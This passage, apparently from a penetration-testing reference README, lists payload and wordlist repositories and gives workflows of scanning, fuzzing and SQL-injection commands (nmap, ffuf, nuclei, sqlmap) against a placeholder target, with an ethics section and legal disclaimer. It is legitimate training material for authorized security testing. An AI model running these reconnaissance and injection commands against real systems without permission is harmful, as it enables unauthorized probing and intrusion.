- Password lists
- Username lists
- Parameter names

**FuzzDB**
```bash
git clone https://github.com/fuzzdb-project/fuzzdb.git
```
- Attack patterns
- Discovery patterns
- Regex patterns

**PayloadsAllTheThings**
```bash
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
```
- Injection payloads
- Upload bypasses
- XXE payloads
- SSRF payloads

**Assetnote Wordlists**
```bash
# Download from https://wordlists.assetnote.io/
```
- Best-in-class discovery wordlists
- Curated from real reconnaissance

**Nuclei Templates**
```bash
# Automatically updated with Nuclei
nuclei -update-templates

# Or clone manually
git clone https://github.com/projectdiscovery/nuclei-templates.git
```
- CVE templates
- Misconfiguration templates
- Exposed panel templates
- Technology detection templates

### Payload Directory Structure

```
payloads/
├── dns/
│   ├── subdomains-1000.txt
│   ├── subdomains-10000.txt
│   └── subdomains-all.txt
├── directories/
│   ├── common.txt
│   ├── directory-list-2.3-medium.txt
│   ├── raft-large-directories.txt
│   └── admin-panels.txt
├── files/
│   ├── common-files.txt
│   ├── backup-files.txt
│   └── raft-large-files.txt
├── parameters/
│   ├── common-params.txt
│   ├── burp-parameter-names.txt
│   └── arjun-params.txt
├── fuzzing/
│   ├── xss-payloads.txt
│   ├── sqli-payloads.txt
│   ├── lfi-payloads.txt
│   ├── rce-payloads.txt
│   ├── ssrf-payloads.txt
│   └── xxe-payloads.txt
├── credentials/
│   ├── usernames.txt
│   ├── passwords.txt
│   └── common-passwords.txt
├── fuzzer-inputs/
│   ├── afl-inputs/
│   ├── honggfuzz-inputs/
│   └── libfuzzer-corpus/
└── nuclei-templates/
    ├── cves/
    ├── misconfigurations/
    ├── exposed-panels/
    └── default-logins/
```

---

## 🔗 Tool Integration Workflows

### Workflow 1: Web Application Assessment

```python
scanner_commands = {
    # Phase 1: Reconnaissance
    "CT-Exposer Subdomain Enum": "python ct-exposer.py -u -d target.com",
    "Nmap Port Scan": r'nmap -p- --open -iL "output\domain_output.txt" -oA "output\nmap"',
    
    # Phase 2: Directory Discovery
    "Ffuf Directory Discovery": r'ffuf -w "payloads\directories\common.txt" -u "https://target.com/FUZZ" -mc 200,301,302,403',
    
    # Phase 3: Parameter Discovery
    "Arjun Parameter Discovery": r'arjun -u "https://target.com/api/endpoint" -oJ "output\arjun.json"',
    "Ffuf Parameter Fuzzing": r'ffuf -w "payloads\parameters\common-params.txt" -u "https://target.com/search?FUZZ=test"',
    
    # Phase 4: Vulnerability Testing
    "Nuclei CVE Scan": r'nuclei -l "output\domain_output.txt" -t cves/ -severity critical,high -o "output\nuclei-cves.txt"',
    "SQLMap SQL Injection": r'sqlmap -u "https://target.com/product?id=1" --batch --risk=3 --level=5',
}
```

### Workflow 2: API Security Testing

```python
scanner_commands = {
    "Arjun API Parameter Discovery": r'arjun -u "https://api.target.com/v1/users" -m POST',
    "Ffuf API Endpoint Discovery": r'ffuf -w "payloads\api\endpoints.txt" -u "https://api.target.com/v1/FUZZ"',
    "Nuclei API Testing": r'nuclei -u "https://api.target.com" -t apis/ -o "output\nuclei-api.txt"',
    "SQLMap API Injection": r'sqlmap -u "https://api.target.com/v1/user?id=1" --batch',
}
```

### Workflow 3: Binary Fuzzing Campaign

```python
scanner_commands = {
    "AFL++ Fuzzing": r'afl-fuzz -i "payloads\afl-inputs" -o "output\afl-crashes" -- target.exe @@',
    "Honggfuzz Fuzzing": r'honggfuzz -i "payloads\honggfuzz-inputs" -o "output\honggfuzz-crashes" -- target.exe ___FILE___',
    "LibFuzzer Campaign": r'.\fuzz_target.exe "payloads\libfuzzer-corpus"',
}
```

### Workflow 4: Network Security Assessment

```python
scanner_commands = {
    "Nmap Service Detection": r'nmap -sV -sC -p- --open target.com -oA "output\nmap-services"',
    "Nmap Vulnerability Scan": r'nmap --script vuln target.com -oN "output\nmap-vulns.txt"',
    "Nuclei Network Templates": r'nuclei -u https://target.com -t network/ -o "output\nuclei-network.txt"',
    "Wireshark Packet Capture": r'tshark -i eth0 -f "host target.com" -a duration:300 -w "output\capture.pcap"',
}
```

### Workflow 5: Comprehensive Security Scan

```python
scanner_commands = {
    # Reconnaissance
    "CT-Exposer": "python ct-exposer.py -u -d target.com",
    "Nmap Full Scan": r'nmap -sV -sC -p- --open -iL "output\domain_output.txt" -oA "output\nmap-full"',
    
    # Web Discovery
    "Ffuf Directories": r'ffuf -w "payloads\directories\directory-list-2.3-medium.txt" -u "https://target.com/FUZZ" -mc 200,301,302,403',
    "Ffuf Parameters": r'ffuf -w "payloads\parameters\common-params.txt" -u "https://target.com/search?FUZZ=test"',
    
    # Vulnerability Scanning
    "Nuclei Full Scan": r'nuclei -l "output\domain_output.txt" -t nuclei-templates/ -severity critical,high,medium -o "output\nuclei-all.txt"',
    "Nuclei CVEs": r'nuclei -l "output\domain_output.txt" -t cves/ -o "output\nuclei-cves.txt"',
    "Nuclei Exposed Panels": r'nuclei -l "output\domain_output.txt" -t exposed-panels/ -o "output\nuclei-panels.txt"',
    
    # Targeted Testing
    "SQLMap Injection": r'sqlmap -u "https://target.com/product?id=1" --batch --risk=3 --level=5',
}
```

---

## 🎓 Best Practices

### Ethical Hacking Guidelines

1. **Only test authorized targets** - Get written permission
2. **Respect scope** - Stay within defined boundaries
3. **Rate limiting** - Don't DoS the target
4. **Data handling** - Protect sensitive findings
5. **Responsible disclosure** - Report vulnerabilities properly

### Tool Usage Tips

**Reconnaissance:**
- Start passive (OSINT, public data)
- Then active (scanning, probing)
- Document everything

**Scanning:**
- Use appropriate rate limits
- Test during maintenance windows
- Monitor for blocking/detection

**Exploitation:**
- Test in isolated environment first
- Have rollback plan
- Document steps for reproduction

**Reporting:**
- Provide clear reproduction steps
- Include screenshots/proof
- Suggest remediation
- Follow disclosure timeline

---

## 🚀 Quick Start Guide

### 1. Set Up Environment

```bash
# Install Kali Linux (VM or WSL)
wsl --install -d kali-linux

# Update system
sudo apt update && sudo apt upgrade -y

# Install essential tools
sudo apt install nmap sqlmap wireshark arjun nuclei -y
```

### 2. Create Payload Directory

```bash
mkdir -p ~/payloads/{dns,directories,parameters,fuzzing,credentials}
cd ~/payloads
git clone https://github.com/danielmiessler/SecLists.git

# Download Nuclei templates
nuclei -update-templates
```

### 3. Run Your First Scan

```bash
# Subdomain enumeration
python ct-exposer.py -u -d target.com

# Port scanning
nmap -sV -sC -p- --open target.com

# Directory discovery
ffuf -w ~/payloads/SecLists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ

# Vulnerability scanning
nuclei -u https://target.com -severity critical,high
```

---

## 📚 Learning Resources

### Official Documentation
- **Nmap**: https://nmap.org/book/
- **Burp Suite**: https://portswigger.net/burp/documentation
- **SQLMap**: https://github.com/sqlmapproject/sqlmap/wiki
- **Wireshark**: https://www.wireshark.org/docs/
- **Nuclei**: https://docs.projectdiscovery.io/
- **AFL++**: https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/

### Training Platforms
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **PentesterLab**: https://pentesterlab.com/

### Bug Bounty Platforms
- **HackerOne**: https://www.hackerone.com/
- **Bugcrowd**: https://www.bugcrowd.com/
- **Intigriti**: https://www.intigriti.com/
- **Synack**: https://www.synack.com/

---

## 🤝 Contributing

Help improve this reference guide:
- Add new tools
- Update installation instructions
- Share workflow examples
- Fix errors or outdated info
- Add use case examples

---

## 📜 License

This reference guide is provided for educational purposes. Always use tools ethically and legally. Unauthorized testing is illegal.

---

## ⚠️ Disclaimer

These tools are provided for authorized security testing only. Users are responsible for complying with all applicable laws and regulations. Only test systems you have explicit permission to assess. Unauthorized use is illegal and unethical.

---

## 🔗 Additional Resources

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **SANS Security Resources**: https://www.sans.org/security-resources/
- **CVE Database**: https://cve.mitre.org/
- **Exploit Database**: https://www.exploit-db.com/
- **ProjectDiscovery**: https://projectdiscovery.io/

---

**⭐ Star this repo if it helped you in your security research!**

**🐛 Found an error? Open an issue!**

**💡 Have a suggestion? Submit a pull request!**

---
